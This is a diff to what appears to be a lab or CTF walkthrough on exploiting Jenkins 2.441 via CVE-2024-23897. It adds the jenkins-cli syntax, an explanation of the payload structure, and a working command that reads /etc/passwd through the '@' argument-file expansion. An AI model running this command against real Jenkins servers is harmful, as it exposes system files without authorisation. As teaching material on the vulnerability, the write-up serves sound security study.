@@ -40,18 +40,24 @@ Now that we have the Jenkins-CLI, how do we use Jenkins-CLI? How do we insert th
 
 ##### How to use Jenkins-CLI
 
+The general syntax of using Jenkins-CLI.jar can be found [here](https://www.jenkins.io/doc/book/managing/cli/#using-the-client). The command should be:
+
+```
+java -jar jenkins-cli.jar [-s JENKINS_URL] [global options...] command [command options...] [arguments...]
+```
+
 ##### How to insert Payload into Jenkins 2.441
 
-Searching `CVE-2024-23897 PoC` we find the following Splunk [site](https://www.splunk.com/en_us/blog/security/security-insights-jenkins-cve-2024-23897-rce.html).
-Reading the section `Payload Body Explanation` we can observe the payload structure as:
+Searching `CVE-2024-23897 PoC` we find the following Splunk [site](https://www.splunk.com/en_us/blog/security/security-insights-jenkins-cve-2024-23897-rce.html). Reading the section `Payload Body Explanation` we can observe the payload structure as:
 
 `[Command Length][Command ('help')][File Path Length][File Path ('@/etc/passwd')][Other Parameters]`
 
+From here we can infere that the injection should be something like `Jenkins-CLI command -s http://<JENKINS_SERVER>:8080 help "@/etc/passwd"`. Therefore, the injection should be:
 
 ```
 java -jar jenkins-cli.jar -s http://<JENKINS_SERVER>:8080 help "@/etc/passwd"
 ```
-
+(pic7)
 
 ?Nonetheless, we don' t find any example of how to implement it. So let's look on Google " CVE-2024-23897 proof of concept" and you will find the following site: https://github.com/3yujw7njai/CVE-2024-23897?
 
